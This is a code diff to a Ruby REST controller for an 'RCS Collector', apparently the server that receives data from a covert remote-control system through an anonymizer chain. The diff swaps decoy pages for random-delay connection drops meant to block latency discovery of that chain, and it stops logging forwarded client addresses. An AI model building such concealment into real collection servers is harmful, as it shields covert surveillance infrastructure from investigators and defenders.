@@ -4,7 +4,6 @@
 
 # relatives
 require_relative 'rest_response'
-require_relative '../../config/decoy'
 
 # from RCS::Common
 require 'rcs-common/trace'
@@ -26,48 +25,48 @@ class RESTController
   STATUS_METHOD_NOT_ALLOWED = 405
   STATUS_CONFLICT = 409
   STATUS_SERVER_ERROR = 500
+  STATUS_BAD_GATEWAY = 502
   
   # the parameters passed on the REST request
   attr_reader :request
 
   @controllers = {}
-  
-  # display a fake page in case someone is trying to connect to the collector
+
+  def initialize(connection)
+    @connection = connection
+  end
+
+  def close_connection
+    EventMachine::close_connection @connection, false
+  end
+
+  def sleep_and_close
+    # sleep a random amount of time
+    # this is done to prevent latency discovery of the anon chain
+    sleep rand
+
+    # close the connection immediately
+    close_connection
+  end
+
+  # fake page in case someone is trying to connect to the collector
   # with a browser or something else
   def http_decoy_page
-    # default decoy page, in case someone mess with the dynamic script
-    code = STATUS_OK
-    page = "<html> <head>" +
-           "<meta http-equiv=\"refresh\" content=\"0;url=http://www.google.com\">" +
-           "</head> </html>"
-    options = {content_type: 'text/html'}
-
-    begin
-      code, page, options = DecoyPage.create @request
-    rescue Exception => e
-      trace :error, "Error creating decoy page: #{e.message}"
-      trace :fatal, e.backtrace.join("\n")
-    end
-
-    trace :info, "[#{@request[:peer]}] Decoy page displayed [#{code}] #{options.inspect}"
-
-    return code, page, options
+    sleep_and_close
+    trace :warn, "[#{@request[:peer]}] Decoy page. Connection closed."
+    return 444, '', {}
   end
 
   def http_bad_request
-    # default decoy page, in case someone mess with the dynamic script
-    page = ''
-    options = {content_type: 'text/html'}
-    begin
-      page, options = BadRequestPage.create @request
-    rescue Exception => e
-      trace :error, "Error creating decoy page: #{e.message}"
-      trace :fatal, e.backtrace.join("\n")
-    end
+    sleep_and_close
+    trace :warn, "[#{@request[:peer]}] Bad request: #{@request.inspect}"
+    return '', {}
+  end
 
-    trace :info, "[#{@request[:peer]}] Bad request: #{@request.inspect}"
-
-    return page, options
+  def http_not_allowed_request
+    sleep_and_close
+    trace :warn, "[#{@request[:peer]}] Not allowed request: #{@request.inspect}"
+    return '', {}
   end
 
   def ok(*args)
@@ -92,7 +91,7 @@ class RESTController
   end
 
   def method_not_allowed(message='', callback=nil)
-    RESTResponse.new(STATUS_METHOD_NOT_ALLOWED, message, {}, callback)
+    RESTResponse.new(STATUS_METHOD_NOT_ALLOWED, *http_not_allowed_request, callback)
   end
 
   def conflict(message='', callback=nil)
@@ -142,10 +141,6 @@ class RESTController
       @params['_id'] = @request[:uri_params].first unless @request[:uri_params].first.nil?
     end
 
-    # get the peer ip address if it was forwarded by a proxy
-    peer = http_get_forwarded_peer(@request[:headers])
-    @request[:peer] = peer unless peer.nil?
-
     # get the anonimizer version
     @request[:anon_version] = http_get_anon_version(@request[:headers])
 
@@ -181,24 +176,11 @@ class RESTController
         return :push
       when 'WATCHDOG'
         return :watchdog
-      when 'OPTIONS', 'TRACE', 'CONNECT'
+      when 'OPTIONS', 'TRACE', 'CONNECT', 'PROPFIND', 'TRACK'
         return :method_not_allowed
       else
         return :bad_request
     end
-  end
-
-  # return the content of the X-Forwarded-For header
-  def http_get_forwarded_peer(headers)
-    # extract the XFF
-    xff = headers[:x_forwarded_for]
-    # no header
-    return nil if xff.nil?
-    # split the peers list
-    peers = xff.split(',')
-    trace :info, "[#{@request[:peer]}] has forwarded the connection for [#{peers.first}]"
-    # we just want the first peer that is the original one
-    return peers.first
   end
 
   def http_get_anon_version(headers)
@@ -216,7 +198,7 @@ class RESTController
 
 end # RCS::Collector::RESTController
 
-require_relative 'collector_controller'
+require_relative 'http_controller'
 
 end # RCS::Collector
 end # RCS
